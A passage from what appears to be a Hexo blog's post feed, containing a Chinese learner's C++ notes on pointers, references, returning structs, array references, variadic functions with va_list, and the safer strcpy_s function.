class="comment">//error,很简单用法问题，a是int类型的变量，直接取地址一个指针a在此处不合理。</span></span><br></pre></td></tr></table></figure><p>修改成指针呢？</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a;</span><br><span class="line">std::cout &lt;&lt; &amp;a &lt;&lt; std::endl;</span><br><span class="line">std::cout &lt;&lt; *&amp;p &lt;&lt; std::endl;  <span class="comment">//上述说过相当于*(&amp;p),&amp;p的地址上存放的是a的地址，*就变成解读&amp;p</span></span><br><span class="line">std::cout &lt;&lt; &amp;*p &lt;&lt; std::endl;  <span class="comment">//而*p表示a的值就是10，&amp;(*p)，就是相当于&amp;a;</span></span><br></pre></td></tr></table></figure><img src="/2022/05/31/function3/007.png" class=""><p>可以看到地址都是一样的。</p><blockquote><p>这个纯看理解，不行多试几个例子或者看看反汇编。重在能区分。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>自古指针都是很恶心的东西，不管放到哪里。要合理区分&amp;是引用还是取地址的情况。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function2</title>
      <link href="/2022/05/30/function2/"/>
      <url>/2022/05/30/function2/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前提到过函数是什么类型的就需要返回什么类型的值，正常变量类型都还好，当指针和引用的时候就有意思了</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">char</span> *str;</span><br><span class="line">str = (<span class="type">char</span> *)<span class="string">&quot;你好世界&quot;</span>;</span><br><span class="line">std::cout &lt;&lt; str;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>C语言的字符串最常用的就是数组的方式声明，反正数组的底层就是指针，所以你用指针也行。</p><img src="/2022/05/30/function2/000.png" class=""><p>但是在使用指针强转的时候，右值的这串中文它属于一个常量，也就是说指针指向了一块常量内存，你就没办法修改它了。<br>如图：<img src="/2022/05/30/function2/001.png" class=""><br>编译器给出了错误，就是说我们没有权限对这块内存写入。</p><p>要套娃的话就是赋给字符串然后强转再改，或者拷贝给另一个字符串，反正能得到结果是首要目标。</p><hr><p>这里就利用自定义函数去拷贝修改返回一个想要的值。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">cstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拷贝函数<code>memcpy()</code>，不过要知道str的长度和一个跟str一样大的指针变量<br>可以直接在cstr里面for循环求长度，也可以自定义函数，因为学的函数这块就姑且用函数了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">cLen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (; str[i]; i++);</span><br><span class="line"><span class="keyword">return</span> ++i;     </span><br><span class="line">    <span class="comment">//因为需要返回i，所以int i的时候就不能写在for循环里面了，不然局部变量出了for循环i就没了</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span> *<span class="title">cstr</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">cLen</span>(str);</span><br><span class="line"><span class="type">char</span> *strP = <span class="keyword">new</span> <span class="type">char</span>[len];</span><br><span class="line">    <span class="comment">//用指针动态分配内存的原因也是因为char在函数中的不仅是局部变量而且存在栈区，函数结束后就销毁了，返回了也没意义</span></span><br><span class="line">    <span class="comment">//而动态分配的内存处于堆区，没有delect之前就搁堆区老老实实呆着</span></span><br><span class="line"><span class="built_in">memcpy</span>(strP, str, len);</span><br><span class="line"><span class="keyword">return</span> strP;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果如图：<img src="/2022/05/30/function2/002.png" class=""></p><p>这个时候你再修改main函数里的str就无所谓了，不是常量了，虽然在空间角度上是有一定浪费.</p><img src="/2022/05/30/function2/003.png" class=""><p>就不打印了毕竟中文占两字节，改了一个估计开头要乱码。</p><hr><p>假设一个游戏有这个一个结构体，做初始化角色用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Box</span>&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们给通过函数传值的时候，怎么传会更友好。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Box <span class="title">createRole</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name, <span class="type">int</span> hp, <span class="type">int</span> mp)</span></span>&#123;</span><br><span class="line">Box box&#123; name,hp,mp &#125;;</span><br><span class="line"><span class="keyword">return</span> box;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果在函数里额外声明一个结构体变量赋值返回，显得很2<br>因为对于内存上它反复开辟销毁很麻烦，虽然字面上很好理解是干什么的。<br>但如果是指针类型的结构体则友好很多，这里就要改一下结构体了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">box</span>&#123;</span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;*Boxs,Box;</span><br><span class="line"><span class="comment">//通过typedef给指针类型的box改名Boxs，正常的box就用Box即可。</span></span><br><span class="line"></span><br><span class="line"><span class="function">Boxs <span class="title">createRole</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name, <span class="type">int</span> hp, <span class="type">int</span> mp)</span></span>&#123;</span><br><span class="line">Boxs box = <span class="keyword">new</span> Box&#123; <span class="built_in">cstr</span>(name),hp,mp &#125;;</span><br><span class="line">    <span class="comment">//传递进来的name我们不希望乱改，就用了const但是结构体参数并不是const，所以用我们之前自定义的函数套一下</span></span><br><span class="line"><span class="keyword">return</span> box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Boxs b = <span class="built_in">createRole</span>(<span class="string">&quot;aaaa&quot;</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对于返回指针类型的函数时，我们需要额外注意这个指针变量不要返回局部变量</p></blockquote><img src="/2022/05/30/function2/005.png" class=""><p>还有一种引用的方法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">box</span>&#123;</span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">int</span> hp;</span><br><span class="line"><span class="type">int</span> mp;</span><br><span class="line">&#125;*Boxs,Box;</span><br><span class="line"></span><br><span class="line"><span class="function">Box&amp; <span class="title">createRole</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* name, <span class="type">int</span> hp, <span class="type">int</span> mp)</span></span>&#123;</span><br><span class="line">Boxs box = <span class="keyword">new</span> Box&#123; <span class="built_in">cstr</span>(name),hp,mp &#125;;</span><br><span class="line"><span class="keyword">return</span> *box;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">Box b = <span class="built_in">createRole</span>(<span class="string">&quot;aaaa&quot;</span>,<span class="number">100</span>,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>引用和指针，指针传递失败还有空指针，引用没有空指针</p></blockquote><img src="/2022/05/30/function2/004.png" class=""><blockquote><p>如图可以看到，当函数是结构体指针类型的时候，接受的一方也得是结构体指针<br>而在引用的时候，接受的一方只需要是相同的结构体即可。</p></blockquote><hr><p>再看引用做参数时的问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">x += <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/30/function2/006.png" class=""><p>这个代码一看就知道没有意义，因为传进去的只是一个值，x加完离开函数就销毁了。想要真的改变就可以用引用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> &amp;x)</span></span>&#123;</span><br><span class="line">x += <span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/30/function2/007.png" class=""><p>引用作为参数的时候，它更加严谨，当传入的变量类型不一致的时候，引用是不能完成操作的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> &amp;x)</span></span>&#123;</span><br><span class="line">x += <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">float</span> a = <span class="number">150.0f</span>;</span><br><span class="line"><span class="built_in">Add</span>(a);</span><br><span class="line">std::cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/30/function2/008.png" class=""><p>很直观的就报错了，甚至都懒得进行隐式转换截断掉后面小数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Add</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line">x += <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">float</span> a = <span class="number">150.0f</span>;</span><br><span class="line"><span class="built_in">Add</span>(a);</span><br><span class="line">std::cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当形参不是引用类型的时候，编译器也懒得鸟你，大不了隐式转换掉。</p><hr><p>数组的引用变量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>];</span><br><span class="line"><span class="type">int</span> &amp;ch1[<span class="number">10</span>] = ch;</span><br></pre></td></tr></table></figure><p>这个写法直接无情报错：<img src="/2022/05/30/function2/009.png" class=""><br>它说不能使用引用的数组，这其实是编译器没有理解。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ch[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">int</span> (&amp;ch1)[<span class="number">10</span>] = ch;</span><br></pre></td></tr></table></figure><p>先告诉编译器ch1是一个引用，然后是一个引用长度为10的数组引用。<br>引用也保持了数组要明确大小的问题，引用数组长度10，被引用的对象的长度也只能为10，否则编译不通过。</p><hr><p>使用引用数组作为形参的时候</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sumI</span><span class="params">(<span class="type">int</span>(&amp;ch)[<span class="number">10</span>])</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="built_in">sizeof</span>(ch);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/30/function2/010.png" class=""><p>它可以用sizeof计算长度，这个相对于指针和不定量参数的时候会方便很多。<br>而且可以使用新版for循环</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sumI</span><span class="params">(<span class="type">int</span>(&amp;ch)[<span class="number">10</span>])</span></span>&#123;</span><br><span class="line"><span class="comment">//std::cout &lt;&lt; sizeof(ch);</span></span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> x : ch) sum += x;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ch[<span class="number">10</span>] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>&#125;;</span><br><span class="line"><span class="type">int</span> x = <span class="built_in">sumI</span>(ch);</span><br><span class="line">std::cout &lt;&lt; x;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/30/function2/011.png" class=""><p>还是挺得劲的。<br><strong>仅限于数组长度明确的时候得劲</strong></p><hr><h2 id="strcpy-s"><a href="#strcpy-s" class="headerlink" title="strcpy_s"></a>strcpy_s</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_Check_return_wat_</span></span><br><span class="line"><span class="function">_ACRTIMP <span class="type">errno_t</span> __cdecl <span class="title">strcpy_s</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_writes_z_(_SizeInBytes) <span class="type">char</span>*       _Destination,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_                         <span class="type">rsize_t</span>     _SizeInBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_z_                       <span class="type">char</span> <span class="type">const</span>* _Source</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>这是在string头文件中的定义。</p><p>为什么会有_s的版本，是因为strcpy原则上是不安全的，它存在致命的缺陷就是缓冲区溢出</p><blockquote><p>缓冲区的溢出就是程序在动态分配的缓冲区中写入了太多的数据，使这个分配区发生了溢出。一旦一个缓冲区利用程序能将运行的指令放在有 root权限的内存中，运行这些指令，就可以利用 root 权限来控制计算机了。<br>默认情况下strcpy都会认为你的缓冲区够大，就只管填充。</p></blockquote><p>回过头来看strcpy_s的形参，char*和char const*都好理解，不能改变的说明是要被拷贝的字符串<br>至于rsize_t速览定义看到其实是一个无符号整型</p><img src="/2022/05/30/function2/012.png" class=""><p>猜测可能是长度有关的。<br>大致使用起来就是<code>strcpy_s(str,strlen(str1),str1);</code></p><p>简单的百度了一下，strlen要+1。<code>strcpy_s(str, strlen(str1)+1, str1);</code></p><p>+1大概是因为stelen没有统计到<code>\0</code>吧，不过如果缓冲区大小不够，发出异常这个不晓得怎么操作<br>按照我们现学现卖就是if判断大小，不行就提示，抛出异常这个面向对象的特点要放后面了。</p><blockquote><p>ps:像当初刚打开vs2019的时候，scanf就会报错，说不安全，要用scanf_s是一个道理，这些都是后面加的安全函数。</p></blockquote><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>欲知后事如何请看下回分解</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>function1</title>
      <link href="/2022/05/29/function1/"/>
      <url>/2022/05/29/function1/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自定义函数的形式和大致参数已经明确，然后就是返回指针和引用之类的.</p><span id="more"></span><hr><h1 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h1><ul><li>cstdarg</li></ul><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>main函数的参数虽然也可以叫不定量，但是毕竟是提前规定了的。</p><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">unsigned</span> count, ...)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>比如实现一串不定量的数字求和，后面的参数就可以用…这种写法，但是必须要知道个数<br>虽然后面用省略表示不定量，但是不是直接说就是数组了，函数里调用起来也挺稀奇的<br>不过越是稀奇古怪用到的就越少，毕竟实际上没有这么多不定量的场景</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x = <span class="built_in">Add</span>(<span class="number">5</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>调用的时候没啥特殊，但在实现部分中，如何调用<code>...</code>才是重点</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">unsigned</span> count, ...)</span></span>&#123;</span><br><span class="line">    va_list arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>va_list其实就是一个char*类型的变量：<img src="/2022/05/29/function1/000.png" class=""><br>如果直接使用<code>char* arg</code>也无可厚非。</p><p>然后就是传递不定量的值，因为引用了cstdarg头文件，所以可以使用封装好的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">unsigned</span> count, ...)</span></span>&#123;</span><br><span class="line">    va_list arg;</span><br><span class="line">    <span class="built_in">va_start</span>(arg,count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/29/function1/001.png" class=""><blockquote><p>传递到指针之后，需要注意用什么类型去读取</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">unsigned</span> count, ...)</span></span>&#123;</span><br><span class="line">    va_list arg;</span><br><span class="line">    <span class="built_in">va_start</span>(arg,count);</span><br><span class="line">    <span class="built_in">va_arg</span>(arg, <span class="type">int</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>va_arg的特点就是可以重复读取，毕竟每调用一次才能往后读取不定量参数<br>于是乎就可以写个for循环。</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">unsigned</span> count, ...)</span></span>&#123;</span><br><span class="line">    va_list arg;</span><br><span class="line">    <span class="built_in">va_start</span>(arg,count);</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i&#123;&#125;; i&lt;count; i++)&#123;</span><br><span class="line">        sum += <span class="built_in">va_arg</span>(arg, <span class="type">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>同理int 类型的函数，别忘了返回值。</p></blockquote><p><strong>然后还要特别注意，因为va_list是一个指针，虽然函数声明周期结束变量可能会被回收，但是肯定是有人为的方式去消除</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">unsigned</span> count, ...)</span></span>&#123;</span><br><span class="line">    va_list arg;</span><br><span class="line">    <span class="built_in">va_start</span>(arg,count);</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i&#123;&#125;; i&lt;count; i++)&#123;</span><br><span class="line">        sum += <span class="built_in">va_arg</span>(arg, <span class="type">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">va_end</span>(arg);</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>那就是va_end(); 用完记得手动释放吧。</p></blockquote><p>最后在main接收返回值并打印</p><img src="/2022/05/29/function1/002.png" class=""><blockquote><p>当然如果说都是一种类型，显然单纯的for循环不是更快<br>所以不定量的含义同时也包含了不同类型的参数时，不过在va_arg的时候你需要合理的控制读取的类型，可能也稍显2b，毕竟也挺麻烦</p></blockquote><hr><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">Add</span><span class="params">(<span class="type">unsigned</span> count, ...)</span></span>&#123;</span><br><span class="line">    va_list arg;</span><br><span class="line">    <span class="built_in">va_start</span>(arg,count);</span><br><span class="line">    std::cout &lt;&lt; &amp;arg &lt;&lt; std::endl;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i&#123;&#125;; i &lt; count; i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;arg累加前：%p\n&quot;</span>,arg);  </span><br><span class="line">        <span class="comment">//也可以用std::cout &lt;&lt; std::hex &lt;&lt; (int)arg;但是感觉C语言这种格式化输出在这里更方便。</span></span><br><span class="line">        sum += <span class="built_in">va_arg</span>(arg, <span class="type">int</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">va_end</span>(arg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/05/29/function1/003.png" class=""><p>简单的打印一下循环开始前arg的地址和每一次变化后地址。<br>不难看出地址每次增加的4其实就是跟变量类型有关。</p><hr><p>你说自己实现类似的功能也不难，但是要规避其它风险的时候设计起来就蹑手蹑脚了，所以说有一些标准需要委员会去发布。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>白天上课刷手机，下午晚上有空打游戏，大半夜回头补补也是没谁了~</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>functionTest</title>
      <link href="/2022/05/28/functionTest/"/>
      <url>/2022/05/28/functionTest/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>做个小测试</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>大致就是利用main函数的参数，去实现拆分参数，不使用原生支持的string功能自己写一个类似的。</p><blockquote><p>filename.exe id:1 pass:123456 contry:china</p></blockquote><p>不管第一个默认的文件名参数，从后面开始，挨个拆出<code>:</code>后面的值</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">searchChar</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>一开始想着是不是要传递:的位置，这样直接截取:后面的就行了。</p></blockquote><p>但是这样又很奇怪，因为只做了返回位置，截取还要另外实现。<br>那好像又要两个自定义函数了，或者在main函数里实现，都是挺麻烦的。</p><p>直接返回ch[] 也不对劲，因为数组是要提前声明大小的……<br>回头一想，数组的底层也是指针，那就返回char*类型的应该也凑合：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">searchChar</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是参数，肯定要有俩，一个原字符串，一个要查询被丢弃的字符串，然后这俩肯定不用修改了，就const限定常量</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">char</span>* <span class="title">searchChar</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">const</span> <span class="type">char</span> *findstr)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进一步堆屎山：</p><figure class="highlight cpp"><table><tr><td 